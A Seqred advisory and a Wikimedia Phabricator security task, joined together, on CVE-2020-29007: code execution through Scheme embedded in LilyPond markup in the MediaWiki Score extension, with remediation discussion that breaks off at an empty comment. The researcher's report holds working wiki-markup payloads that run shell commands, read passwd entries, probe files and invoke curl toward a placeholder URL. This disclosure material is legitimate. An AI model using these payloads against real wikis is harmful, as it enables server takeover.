=== Content from seqred.pl_3cf0f6fd_20250119_142417.html ===


[![SEQRED](https://seqred.pl/wp-content/uploads/2019/01/logo.jpg)](https://seqred.pl/en/)

* About
  + [Seqred](https://seqred.pl/en/about/)
  + [Press Releases](https://seqred.pl/en/press-releases/)
* [Services](https://seqred.pl/en/services/)
  + Cloud Cybersecurity
    - [Cloud Services Security](https://seqred.pl/en/cloud-services-security/)
  + Product Assessment
    - [Mobile device security](https://seqred.pl/en/mobile-device-security/)
    - [Security code review](https://seqred.pl/en/security-code-review/)
    - [Secure Product Development](https://seqred.pl/en/secure-product-development-2/)
  + Offensive Cybersecurity
    - [Penetration tests](https://seqred.pl/en/penetration-tests/)
    - [Red Team](https://seqred.pl/en/red-teaming/)
  + Infrastructure Cybersecurity
    - [Cybersecurity for Faciliity Related Control Systems](https://seqred.pl/en/cybersecurity_for_faciliity_related_control_systems/)
    - [CMMC assessment](https://seqred.pl/en/cmmc-assessment/)
    - [Smart Building Cybersecurity](https://seqred.pl/en/smart-building-cybersecurity/)
    - [AMI system security](https://seqred.pl/en/ami-system-security/)
    - [Network segmentation](https://seqred.pl/en/network-segmentation/)
  + NIS2 Directive
    - [NIS Directive Audit](https://seqred.pl/en/nis-directive-audit/)
    - [Security Audit ICS](https://seqred.pl/en/security-audit-ics/)
    - [Cybersecurity Bill of Materials](https://seqred.pl/en/cbom-en/)
    - [Critical Infrastructure protection](https://seqred.pl/en/critical_infrastructure/)
  + Threat Management
    - [Open Source Intelligence / OSINT](https://seqred.pl/en/open-source-intelligence/)
    - [Threat Intelligence](https://seqred.pl/en/threat-intelligence-en/)
* Products
  + [SMX Secure Media Exchange](https://seqred.pl/en/smx-secure-media-exchange-en/)
  + [Secure Remote Access](https://seqred.pl/en/secure-remote-access-eng/)
* [Events](https://seqred.pl/en/events/)
* [Blog](https://seqred.pl/en/blog-en/)
* [Contact](https://seqred.pl/en/contact/)
* [](https://www.linkedin.com/company/seqred/)
* [](https://twitter.com/Seqred_)
* [](https://www.facebook.com/pl.seqred)
* [](https://www.youtube.com/channel/UCP6sxA3WBNFphZKp69atpDA)
* [![PL](/wp-content/polylang/pl_PL.jpg)PL](https://seqred.pl/cve-2020-29007-zdalne-wykonanie-kodu-w-mediawiki-score/)

Select Page

![](https://seqred.pl/wp-content/uploads/2020/04/Maciej-Miszczyk-Seqred.png)
#### Maciej Miszczyk

2 December 2020

# CVE-2020-29007 – remote code execution in Mediawiki Score

#### Score is a Mediawiki extension which generates musical notation based on user-provided Lilypond or ABC markup. During our tests, we have determined it is vulnerable to remote code execution through Scheme code embedded in Lilypond markup.

* CVEID: **CVE-2020-29007**
* Name of the affected product(s) and version(s): **Mediawiki Score (all versions up to 0.3.0)**
* Problem type: **CWE-96: Improper Neutralization of Directives in Statically Saved Code (‘Static Code Injection’)**

![](https://seqred.pl/wp-content/uploads/2019/09/Seqred_CVE.jpg)
> ### Summary

All version of Score (up to and including 0.3.0) allow the execution of arbitrary user-controlled code within the context of a webserver process.

> ### Description

Score extension generates musical notation by passing user-controlled Lilypond or ABC markup to a GNU Lilypond binary. Because the binary is executed without the -dsafe option, it will execute arbitrary Guile Scheme code embedded within Lilypond markup, including the code which interacts with operating system shell.

To exploit this vulnerability, the attacker must be able to edit any article on the vulnerable wiki. In most configurations, it should be possible for the unauthenticated attacker.

> ### Reproduction

**1.** Start editing any article on a wiki.

**2.** Replace the articles contents with the following code:

{{Image frame|content=\new Staff <<{g^#

(number->string(system "/usr/bin/false"))

}>>}}

**3.** Click ‘show preview’

**4.** If the output contains an image which looks like this, the wiki is vulnerable:

![screenshot CVE](https://seqred.pl/wp-content/uploads/2020/12/Zrzut-ekranu-2020-11-13-o-11.14.14-1-300x86.png)

> ### Remedy

Disable Score extension.

### Powiązane wpisy

* [![CVE](https://seqred.pl/wp-content/uploads/2019/09/Seqred_CVE.jpg)](https://seqred.pl/en/cve-privilege-escalation-in-andy/ "CVE-2019-14326 – privilege escalation in Andy")
  ##### [CVE-2019-14326 – privilege escalation in Andy](https://seqred.pl/en/cve-privilege-escalation-in-andy/ "CVE-2019-14326 – privilege escalation in Andy")

  23 March 2020
* [![CVE](https://seqred.pl/wp-content/uploads/2019/09/Seqred_CVE-1.jpg)](https://seqred.pl/en/cve-gurux-gxdlms-director/ "Multiple vulnerabilities in Gurux GXDLMS Director – remote code execution")
  ##### [Multiple vulnerabilities in Gurux GXDLMS Director – remote code execution](https://seqred.pl/en/cve-gurux-gxdlms-director/ "Multiple vulnerabilities in Gurux GXDLMS Director – remote code execution")

  24 February 2020
* [![Seqred CVE](https://seqred.pl/wp-content/uploads/2019/12/Seqred_CVE-1.jpg)](https://seqred.pl/en/cve-remote-code-execution-in-memu/ "CVE-2019-14514 – remote code execution in MEmu")
  ##### [CVE-2019-14514 – remote code execution in MEmu](https://seqred.pl/en/cve-remote-code-execution-in-memu/ "CVE-2019-14514 – remote code execution in MEmu")

  4 February 2020

### Dodaj komentarz

# 0 Comments

### Submit a Comment [Cancel reply](/en/cve-2020-29007-remote-code-execution-in-mediawiki-score/#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name \*

Email \*

Website

Submit Comment

Δ

SEQRED Sp. z o.o.

SEQRED International Sp. z o.o.

Rzymowskiego 34, 02-697 Warszawa

tel. +48 22 292 32 23

fax +48 22 292 32 21

[[email protected]](/cdn-cgi/l/email-protection#78171e1e111b1d380b1d090a1d1c560814)

[Privacy Policy](https://seqred.pl/en/privacy-policy/) All rights reserved © SEQRED 2021



=== Content from phabricator.wikimedia.org_9c9cb718_20250119_125639.html ===
Page Menu[HomePhabricator](/)

* SearchConfigure Global Search

[Log In](https://phabricator.wikimedia.org/auth/start/?next=%2FT257062)[Create Task](/maniphest/task/edit/nocreate/) [Maniphest](/maniphest/)  T257062
# Lilypond seemingly not subject to restrictions (CVE-2020-29007)Closed, Resolved[Public](/policy/explain/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/view/)SecurityActions

* [Edit Task](/maniphest/task/edit/257062/)
* Edit Related Tasks...
* [Create Subtask](/maniphest/task/subtask/257062/)
* [Edit Parent Tasks](/search/rel/task.has-parent/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)
* [Edit Subtasks](/search/rel/task.has-subtask/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)
* [Merge Duplicates In](/search/rel/task.merge-in/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)
* [Close As Duplicate](/search/rel/task.close-as-duplicate/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)
* Edit Related Objects...
* [Edit Commits](/search/rel/task.has-commit/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)
* [Edit Mocks](/search/rel/task.has-mock/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)
* Subscribe
* [Mute Notifications](/subscriptions/mute/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)
* [Protect as security issue](/wmf/escalate-task/257062/)
* [Award Token](/token/give/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)
* [Flag For Later](/flag/edit/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)

Assigned To

|  | [Legoktm](/p/Legoktm/) |
| --- | --- |

Authored By

|  | [Reedy](/p/Reedy/) |
| --- | --- |
| Jul 3 2020, 4:16 PM2020-07-03 16:16:57 (UTC+0) |

Tags

* [Security-Team](/tag/security-team/) [(Watching)](/project/board/1179/)
* [Security](/tag/security/)
* [MediaWiki-extensions-Score](/tag/mediawiki-extensions-score/) [(In Progress)](/project/board/613/)
* [WMF-General-or-Unknown](/tag/wmf-general-or-unknown/)
* [Wikimedia-Incident](/tag/wikimedia-incident/) [(Awaiting report)](/project/board/2143/)
* [MW-1.35-notes (1.35.0-wmf.41; 2020-07-14)](/project/view/4807/)
* [MW-1.36-notes (1.36.0-wmf.1; 2020-07-21)](/project/view/4480/)
Referenced Files

|  | [F31946427: 0001-SECURITY-Prevent-invoking-firejail-s-output-function.patch](/F31946427) |
| --- | --- |
| Jul 24 2020, 12:30 AM2020-07-24 00:30:56 (UTC+0) |

|  | [F31923463: export2.png](/F31923463) |
| --- | --- |
| Jul 10 2020, 2:26 PM2020-07-10 14:26:10 (UTC+0) |

|  | [F31923461: export.png](/F31923461) |
| --- | --- |
| Jul 10 2020, 2:26 PM2020-07-10 14:26:10 (UTC+0) |

|  | [F31916379: 0001-mediawiki-Create-etc-firejail-mediawiki.local.patch](/F31916379) |
| --- | --- |
| Jul 3 2020, 9:33 PM2020-07-03 21:33:23 (UTC+0) |

Subscribers

|  | [Aklapper](/p/Aklapper/) |
| --- | --- |

|  | [akosiaris](/p/akosiaris/) |
| --- | --- |

|  | [Base](/p/Base/) |
| --- | --- |

|  | [BEANS-X2](/p/BEANS-X2/) |
| --- | --- |

|  | [• brooke](/p/brooke/) |
| --- | --- |

|  | [CDanis](/p/CDanis/) |
| --- | --- |

|  | [Daimona](/p/Daimona/) |
| --- | --- |

[View All 21 Subscribers](/subscriptions/list/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/)
# Description

Report from security@

---

Hello,

I’m a security researcher and I have discovered a vulnerability which is present in Wikipedia. I am not sure if it’s caused by a bug in MediaWiki, the extension used for LilyPond (either LilyPond or Score), the (configuration of MW or such plugin), LilyPond’s -dsafe sandbox or GNU Guile’s --r5rs-safe sandbox (although I do think that it’s not LilyPond or Guile bug, as I wasn’t able to run e.g. system function on LilyPond with -dsafe; I think it’s a configuration bug), but it seems that the sandboxing doesn’t work properly.

While I didn’t perform any serious exploitation, throughout the testing it became clear that I can perform several actions which I should not be able to do, like exploring the filesystem, reading /etc/passwd entries or **executing shell commands**.

Here’s a simple template for testing:

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

[scheme code goes here]

}>></score>}}
```

The output of the template will be a score with a single note, with command’s output rendered as its caption.

For examples:

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

(number->string (system “/bin/false”))

}>></score>}}
```

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

(number->string (system “/bin/true”))

}>></score>}}
```

This confirms that we have command execution as on Wikipedia the first one will render 256 as a caption and the second one will render 0. This is because /bin/false is a program that exits immediately with a non-zero exit code, /bin/true exits immediately with a zero exit code, system function executes a shell command and returns exit code number, and number->string converts it to string.

Other available command-execution functions include execl, excle and execlp.

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

(object->string (getpwuid 0))

}>></score>}}
```

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

(object->string (getpwuid (getuid)))

}>></score>}}
```

The first one uses Guile Scheme standard library to parse root’s entry in /etc/passwd (getpwuid 0), then converts it to a string representation (object->string). The second one does the same thing for currently logged-in user (on Wikipedia it is www-data).

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

(if (file-exists? “/var/www/html/index.html”) “true” “false”)

}>></score>}}
```

This can explore the file system (we can list directory contents with opendir and readdir procedures)

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

(object->string (uname))

}>></score>}}
```

This can get system info

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

(if (defined? ‘connect) “true” “false”)

}>></score>}}
```

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

(if (defined? ‘socket) “true” “false”)

}>></score>}}
```

This checks for networking-related functions (socket, connect); didn’t try running those though.

```
{{Image frame|content=<score vorbis=”1” lang=”lilypond”>\new Staff <<{c^#

(number->string (system “/usr/bin/curl [URL HERE]”))

}>></score>}}
```

This should send request with curl; in my tests, it doesn’t work and causes an error when rendering page.

In my opinion, those actions should not be allowed as they allow for code execution and probably further exploitation. Functions which allow execution of system commands, making network connections, direct access to file system and reading of system info should not be available.

---

end of email

# Details

|  | Subject | Repo | Branch | Lines +/- |
| --- | --- | --- | --- | --- |
|  | [Nicer handling for disabling of shell execution](https://gerrit.wikimedia.org/r/c/615893) | [mediawiki/extensions/Score](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score) | [REL1\_31](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score/%2B/REL1_31) | +94 -11 |
|  | [Nicer handling for disabling of shell execution](https://gerrit.wikimedia.org/r/c/615889) | [mediawiki/extensions/Score](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score) | [REL1\_34](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score/%2B/REL1_34) | +92 -11 |
|  | [Nicer handling for disabling of shell execution](https://gerrit.wikimedia.org/r/c/615884) | [mediawiki/extensions/Score](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score) | [REL1\_35](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score/%2B/REL1_35) | +98 -11 |
|  | [Nicer handling for disabling of shell execution](https://gerrit.wikimedia.org/r/c/614596) | [mediawiki/extensions/Score](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score) | [master](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score/%2B/master) | +98 -11 |
|  | [[1.35.0-wmf.41] Nicer handling for disabling of shell execution](https://gerrit.wikimedia.org/r/c/614040) | [mediawiki/extensions/Score](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score) | [wmf/1.35.0-wmf.41](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Score/%2B/wmf/1.35.0-wmf.41) | +98 -11 |
|  | [Temporarily turn off LilyPond execution](https://gerrit.wikimedia.org/r/c/609470) | [operations/mediawiki-config](https://gerrit.wikimedia.org/r/plugins/gitiles/operations/mediawiki-config) | [master](https://gerrit.wikimedia.org/r/plugins/gitiles/operations/mediawiki-config/%2B/master) | +3 -0 |

[Customize query in gerrit](https://gerrit.wikimedia.org/r/#/q/bug:T257062)
# Related ObjectsSearch...

* Task Graph
* Mentions

|  |  | Status | Subtype | Assigned | Task |
| --- | --- | --- | --- | --- | --- |
|  |  | Resolved |  | [tstarling](/p/tstarling/) | T257066 [Extension:Score / Lilypond is disabled on all wikis](/T257066) |
|  |  | Open |  | *None* | T259208  [PDF export should render music scores natively, i.e. not as images](/T259208) |
|  |  | Resolved | Security | [tstarling](/p/tstarling/) | T257091 [Re-enable the Score extension in safe mode](/T257091) |
|  |  | Resolved | Security | [Legoktm](/p/Legoktm/) | T257062 [Lilypond seemingly not subject to restrictions (CVE-2020-29007)](/T257062) |
|  |  | Resolved | Security | [faidon](/p/faidon/) | T258547 [LilyPond allows arbitrary PostScript and does not use -dSAFER (CVE-2020-17353)](/T258547) |

Mentioned In [T332850: Undeploy DoubleWiki Extension from Wikimedia production](/T332850)
[T276267: Security Issue Access Request for esanders](/T276267)
[T258547: LilyPond allows arbitrary PostScript and does not use -dSAFER (CVE-2020-17353)](/T258547)
[T257100: Set up automated/regular end-to-end testing of potential and past security issues](/T257100)
[T257091: Re-enable the Score extension in safe mode](/T257091)
[T257070: Standardise setup of Loggers](/T257070) Mentioned Here [T259210: LilyPond safe mode escape due to output-def-lookup and output-def-scope (CVE-2020-17354)](/T259210)
[T258763: Vulnerabilities in firejail due to --output (CVE-2020-17367, CVE-2020-17368)](/T258763)
[T256877: Handle sunset of stretch-backports](/T256877)
[T257623: Add specific class to Score error box](/T257623)
[T136402: PdfHandler extension doesn't use -dSAFER option of ghostscript](/T136402)
[T172584: Securing external binaries run by MediaWiki](/T172584)
[T161293: Paper format with Score extension in Wikipedia is A4 only](/T161293)
[T174413: Set $wgScoreSafeMode to false](/T174413)
[T257066: Extension:Score / Lilypond is disabled on all wikis](/T257066)
[T171372: Find alternative to safe mode in Lilypond](/T171372)
[T172582: Run score binaries in a firejail](/T172582)
[T181535: Convert Score binaries to use MediaWiki shell restrictions](/T181535)
[rOMWC91ad49802ac9: Set $wgRestrictionMethod = 'firejail'; everywhere](/rOMWC91ad49802ac9e87949cfc47d68d9f0eebd662852)
[rOMWCfadc379970d1: Fix $wgShellRestrictionMethod typo](/rOMWCfadc379970d10ebbebb69de5d06c4693e36d1184)
[rOMWC2b6e57e06056: Revert "Fix $wgShellRestrictionMethod typo"](/rOMWC2b6e57e060563dcd48fcbb2e5a9bd3d9d104fa3b)
[rOMWCa17245914795: Invariant config cleanup: III - SVG rendering](/rOMWCa17245914795dbf28b91f19f083528a818ec36db)
### Event Timeline

There are a very large number of changes, so older changes are hidden. [Show Older Changes](/transactions/showolder/PHID-TASK-lhn2pf3pgnxyjk5ml6ui/?after=6277772&quoteTargetID=UQ0_1&quoteRef=T257062)[Ebe123](/p/Ebe123/) added a comment.[Jul 3 2020, 7:21 PM2020-07-03 19:21:59 (UTC+0)](#6277773)Comment Actions

Yes, I do believe such features would be expected to work through the Score extension, and a list of tasks disabling safe mode is in the description of [T174413: Set $wgScoreSafeMode to false](/T174413). An example is with paper sizes, which get changed for Wikisource and such (the example from [T161293: Paper format with Score extension in Wikipedia is A4 only](/T161293) is <https://de.wikipedia.org/w/index.php?title=Benutzer:Reiner_Stoppok/Tanzlied_aus_Poniky> ). Also just generally, I'd expect it to work on snippets like LY's official examples: <http://lilypond.org/examples.html> (which may include colours). As these blocked interfaces are expressly for the requested features, it would be hard/impossible to function without.

[Reedy](/p/Reedy/) added a comment.[Jul 3 2020, 9:03 PM2020-07-03 21:03:08 (UTC+0)](#6277887)Comment Actions

Cross linking [T172584: Securing external binaries run by MediaWiki](/T172584) for reference purposes too

[sbassett](/p/sbassett/) subscribed.[Jul 3 2020, 9:12 PM2020-07-03 21:12:48 (UTC+0)](#6277897)

[Krinkle](/p/Krinkle/) added a comment.Edited · [Jul 3 2020, 9:14 PM2020-07-03 21:14:30 (UTC+0)](#6277899)Comment Actions
> In [T257062#6277773](/T257062#6277773), [@Ebe123](/p/Ebe123/) wrote:
>
> Yes, I do believe such features would be expected to work through the Score extension, and a list of tasks disabling safe mode is in the description of [T174413: Set $wgScoreSafeMode to false](/T174413). An example is with paper sizes, which get changed for Wikisource and such […]. Also just generally, I'd expect it to work on snippets like LY's official examples: <http://lilypond.org/examples.html> (which may include colours). As these blocked interfaces are expressly for the requested features, it would be hard/impossible to function without.

Thanks, that helps.

I think any mode in which Lilypond does not do anything to at least try to disallow use of system, open-pipe, open-input-pipe, file-exists etc is unacceptable in production. Regardless of any firejail configuration. I see firejail as protection in case Lilypond has a leak, not as the first line of defence.

The features you describe seem related to Lilypond and its user-facing purpose, those seem fine. Why are those disabled in Lilypond outside safe mode? What makes them unsafe? Should there be another mode that enables only these features but not the others?

[Krinkle](/p/Krinkle/) added a subscriber: [Legoktm](/p/Legoktm/).[Jul 3 2020, 9:14 PM2020-07-03 21:14:53 (UTC+0)](#6277900)

[Legoktm](/p/Legoktm/) added a comment.[Jul 3 2020, 9:33 PM2020-07-03 21:33:23 (UTC+0)](#6277921)Comment Actions
> In [T257062#6277501](/T257062#6277501), [@Reedy](/p/Reedy/) wrote:
>
> ...
>
> But /etc/firejail/mediawiki.local doesn't exist in Wikimedia production, and seemingly productions [mediawiki-converters.profile](https://gerrit.wikimedia.org/r/plugins/gitiles/operations/puppet/%2B/0aeff77f0f0cc239f554408ed5b84d2743434772/modules/mediawiki/files/mediawiki-converters.profile) isn't actually used

0001-mediawiki-Create-etc-firejail-mediawiki.local.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/clcezgh4uh555fwlrwqy/PHID-FILE-4flmynvuoq5ktbjvcztx/0001-mediawiki-Create-etc-firejail-mediawiki.local.patch)

[Krinkle](/p/Krinkle/) added a subscriber: [faidon](/p/faidon/).[Jul 3 2020, 11:33 PM2020-07-03 23:33:44 (UTC+0)](#6278115)[Krinkle](/p/Krinkle/) added a subscriber: [Platonides](/p/Platonides/).[Krinkle](/p/Krinkle/) mentioned this in [T257091: Re-enable the Score extension in safe mode](/T257091).[Jul 4 2020, 1:17 AM2020-07-04 01:17:49 (UTC+0)](#6278218)[Krinkle](/p/Krinkle/) added a parent task: [T257091: Re-enable the Score extension in safe mode](/T257091).[Legoktm](/p/Legoktm/) mentioned this in [T257100: Set up automated/regular end-to-end testing of potential and past security issues](/T257100).[Jul 4 2020, 8:13 AM2020-07-04 08:13:50 (UTC+0)](#6278604)[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) subscribed.[Jul 4 2020, 9:51 AM2020-07-04 09:51:54 (UTC+0)](#6278663)Comment Actions
> In [T257062#6277899](/T257062#6277899), [@Krinkle](/p/Krinkle/) wrote:
>
> I think any mode in which Lilypond does not do anything to at least try to disallow use of system, open-pipe, open-input-pipe, file-exists etc is unacceptable in production. Regardless of any firejail configuration. I see firejail as protection in case Lilypond has a leak, not as the first line of defence.

Definitely, yes! Firejail is an additional mitigation layer and defense in depth (to e.g. lessen the impact of code execution vulnerabilities in executed external binaries such as convert/image), but should never the sole safeguard against code execution. With the current (known risky) setup of Mediawiki/extensions shelling out to external binaries the individual parts which protect us are:

* Restriction of parameters/options passed to the external binary (to e.g. prevent shell command injection when running the binary, disable insecure modes etc.)
* Keeping our infrastructure rigorously patched for known security issues, limiting the impact of code execution for chained exploits (especially preventing local privilege escalation, we're not doing all those pesky reboots for nothing :-)

Firejail is simply an additional layer on top of that which makes some exploitation harder, but not what protects us in the first place. That said, I'll have a more in depth look on Monday what we can do to create a more specific profile for Lilypond, in contrast to the generic mediawiki firejail profile we could create a specific one for Lilypond.

In fact this whole task is very similar to <https://phabricator.wikimedia.org/T136402> in the PdfHandler extension which was found/fixed back in 2016.

[faidon](/p/faidon/) added a comment.[Jul 4 2020, 11:42 AM2020-07-04 11:42:36 (UTC+0)](#6278732)Comment Actions

With a cursory look from yesterday, the following issues apply or would need further investigation:

* We did not run lilypond in a firejail due to a mediawiki-config configuration bug.
* We did not run lilypond in safe mode, on purpose, as safe mode breaks a number of common features. With a very small sample, about 50% of our existing files break. [@Platonides](/p/Platonides/) may have better numbers. Some of these may be intentional (for e.g. resource use), but some may be unintentional (e.g. color definition are not defined as symbols). It does not feel like the safe codepaths are well used or tested, which is a problem on its own.
* Lilypond's code does not seem to be safe-by-default. -dsafe is not the default and only buried in the documentation. Variables/methods are unsafe by default, e.g. define-public is unsafe and define-safe-public is the safe version, rather than vice-versa. In many places the mode is not called "safe", but "safe*r*", which is... scary. Lilypond has a --jail option that recommends instead of safe, but which is nothing but a setgid/setuid/chroot/chdir; hardly secure.
* ["The Guile interpreter is part of LilyPond, which means that Scheme can be included in LilyPond input files. There are several methods for including Scheme in LilyPond"](https://lilypond.org/doc/v2.21/Documentation/extending/lilypond-scheme-syntax). Guile is a powerful language, with [POSIX in its stdlib](https://www.gnu.org/software/guile/manual/html_node/POSIX.html), as well as [Dynamic FFI](https://www.gnu.org/software/guile/manual/html_node/Dynamic-FFI.html), essentially allowing arbitrary code execution *by design*. Guile has a [sandboxed evaluation mode](https://www.gnu.org/software/guile/manual/html_node/Sandboxed-Evaluation.html) (h/t [@CDanis](/p/CDanis/)), but Lilypond does not seem to employ it. Effectively, this a "Microsoft Excel runs macros by default" blast from the past situation :)
* Besides the use of Scheme per se, Lilypond also uses PostScript as an intermediate format, relying on Ghostscript to convert to PNG. It does not call Ghostscript with -dSAFER, or in some cases calls it with -dNOSAFER. This is explicit, present in the version we run in production, but also as recent as with commits as recent as 2 weeks ago ([Revert adding .setsafe for Ghostscript command](http://git.savannah.gnu.org/gitweb/?p=lilypond.git;a=commit;h=e28b880ce3e92e6055d1973c3b2446db6da2699a)). It also allows users to embed arbitrary postscript using \postscript, effectively allowing arbitrary code execution, *even in safe mode*. This is perhaps also indicative of upstream's attitude towards considering all input as trusted.
* Similar injection code paths could be present in other backends, including e.g. its SVG output; it's unclear whether it allows arbitrary SVG elements to be included (including maybe <script>?). I also don't think we use SVG in production right now? But one could imagine an otherwise innocuous change being deployed to enable it in the future, so we should at least evaluate this or add a bunch of warnings for our future selves.
* All in all, I think this needs to be discussed with upstream, to hopefully result into a mindset shift with regards to whether input is considered trusted or untrusted by default. In its current state, I don't think it's reasonable for users to even run this on their desktops with anything but scores they've personally handcrafted, or for distributors like Debian to ship this without warnings to that effect.
[Ebe123](/p/Ebe123/) added a comment.[Jul 4 2020, 12:02 PM2020-07-04 12:02:21 (UTC+0)](#6278767)Comment Actions

Yes, arbitrary SVG can be included in LilyPond code, including scripts. We don't use SVG though as there are some output bugs.

[Miszczyk](/p/Miszczyk/) added a comment.[Jul 4 2020, 12:52 PM2020-07-04 12:52:29 (UTC+0)](#6278828)Comment Actions
> In [T257062#6278732](/T257062#6278732), [@faidon](/p/faidon/) wrote:
>
> * All in all, I think this needs to be discussed with upstream, to hopefully result into a mindset shift with regards to whether input is considered trusted or untrusted by default. In its current state, I don't think it's reasonable for users to even run this on their desktops with anything but scores they've personally handcrafted, or for distributors like Debian to ship this without warnings to that effect.

In my personal opinion this would be the best choice, I think LilyPond would need significant changes in codebase to be secure for remote usage (basically, it should be redesigned to use a more restricted subset of Scheme, with no POSIX functionality and no way to use I/O ports like network or filesystem). if I had to place LilyPond scores on the web, I'd upload the locally pre-rendered images and midis, plus a reference to the source code so anyone could compile them locally. But I am speaking from the perspective of a security researcher and don't know if it's acceptable for Wikipedia.

[Tgr](/p/Tgr/) subscribed.[Jul 5 2020, 3:00 PM2020-07-05 15:00:43 (UTC+0)](#6279647)[Marostegui](/p/Marostegui/) subscribed.[Jul 6 2020, 4:09 AM2020-07-06 04:09:01 (UTC+0)](#6280390)[Base](/p/Base/) subscribed.[Jul 6 2020, 5:24 AM2020-07-06 05:24:09 (UTC+0)](#6280468)[akosiaris](/p/akosiaris/) subscribed.[Jul 6 2020, 6:48 AM2020-07-06 06:48:57 (UTC+0)](#6280528)[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Jul 6 2020, 9:24 AM2020-07-06 09:24:57 (UTC+0)](#6280810)Comment Actions

I'll get in touch with Lilypond wrt a secure-by-default approach, with explicit opt-in for risky features (which might be needed by some files in the wild). The documentation speaks about -dsafe being "for web servers", but no application should default to arbitrary code injection when running something as innocuous as "lilypond file.ly". Failing that, there's still the possibility to switch over Debian's packages of lilypond to a sane default (might be a simple as switching the default in lily/global-vars.cc, needs a closer look). It's not uncommon that Debian has stricter defaults than upstream, e.g. Debian's sudo applied environment variable whitelisting for several years until it was eventually adopted by upstream as well, but ideally this happens in the upstream code base.

Even Ghostscript finally defaulted to dsafer in the 9.50 release late last year...

[Reedy](/p/Reedy/) added a comment.[Jul 6 2020, 12:06 PM2020-07-06 12:06:02 (UTC+0)](#6281474)Comment Actions
> In [T257062#6280810](/T257062#6280810), [@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) wrote:
>
> I'll get in touch with Lilypond wrt a secure-by-default approach, with explicit opt-in for risky features (which might be needed by some files in the wild). The documentation speaks about -dsafe being "for web servers", but no application should default to arbitrary code injection when running something as innocuous as "lilypond file.ly". Failing that, there's still the possibility to switch over Debian's packages of lilypond to a sane default (might be a simple as switching the default in lily/global-vars.cc, needs a closer look). It's not uncommon that Debian has stricter defaults than upstream, e.g. Debian's sudo applied environment variable whitelisting for several years until it was eventually adopted by upstream as well, but ideally this happens in the upstream code base.
>
> Even Ghostscript finally defaulted to dsafer in the 9.50 release late last year...

Thanks Moritz. Fingers crossed we get some sane responses, but I guess this might take a while.

Could you also have a look at Lego's patch below?

> In [T257062#6277921](/T257062#6277921), [@Legoktm](/p/Legoktm/) wrote:
> > In [T257062#6277501](/T257062#6277501), [@Reedy](/p/Reedy/) wrote:
> >
> > ...
> >
> > But /etc/firejail/mediawiki.local doesn't exist in Wikimedia production, and seemingly productions [mediawiki-converters.profile](https://gerrit.wikimedia.org/r/plugins/gitiles/operations/puppet/%2B/0aeff77f0f0cc239f554408ed5b84d2743434772/modules/mediawiki/files/mediawiki-converters.profile) isn't actually used
>
> 0001-mediawiki-Create-etc-firejail-mediawiki.local.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/clcezgh4uh555fwlrwqy/PHID-FILE-4flmynvuoq5ktbjvcztx/0001-mediawiki-Create-etc-firejail-mediawiki.local.patch)

I know this isn't sufficient to re-enable lilypond as is, but for both when we do, and for the other shell scripts we still run from MW currently, this helps provide at least a more sensible firejail default profile, rather than just the contents of include /etc/firejail/globals.local, and whatever restriction has been set at point of running (things like no network) by the developer.

In some cases (including lilypond), this was lost when refactoring from individual wrapper scripts, which included the mediawiki-converters.profile, to the "default" included in MediaWiki, which resulted in quite a few less restricted paths etc

[Tgr](/p/Tgr/) added a comment.[Jul 6 2020, 1:12 PM2020-07-06 13:12:37 (UTC+0)](#6281700)Comment Actions

Given that the process for rendering scores includes two different steps which include interpreting a fully generic script language, would it not be more appropriate as a standalone service, where shell takeover could not expose the database or MediaWiki private settings?

[CDanis](/p/CDanis/) added a subscriber: [Joe](/p/Joe/).[Jul 6 2020, 1:16 PM2020-07-06 13:16:09 (UTC+0)](#6281715)Comment Actions
> In [T257062#6281700](/T257062#6281700), [@Tgr](/p/Tgr/) wrote:
>
> Given that the process for rendering scores includes two different steps which include interpreting a fully generic script language, would it not be more appropriate as a standalone service, where shell takeover could not expose the database or MediaWiki private settings?

Indeed, although that of course involves much more work. [@Joe](/p/Joe/) and I had some discussion over the weekend about how to safely run "conversion lambdas" (which include Lilypond, image reformats, etc) on k8s in a sandboxed way (probably involving [gVisor](https://github.com/google/gvisor) on special 'insecure' kube hosts. We will probably put together a design document.

[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Jul 6 2020, 1:24 PM2020-07-06 13:24:15 (UTC+0)](#6281738)Comment Actions
